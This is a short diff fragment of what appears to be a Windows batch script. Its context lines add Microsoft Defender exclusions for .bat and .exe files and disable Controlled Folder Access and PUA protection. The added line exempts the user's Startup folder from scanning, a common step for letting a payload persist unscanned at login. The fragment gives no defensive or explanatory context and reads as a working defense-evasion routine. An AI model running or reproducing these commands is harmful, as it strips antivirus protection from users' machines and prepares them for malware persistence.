@@ -33,6 +33,8 @@ powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
 
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
 
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"
+
 powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
 
 powershell.exe -command "Set-MpPreference -PUAProtection disable"
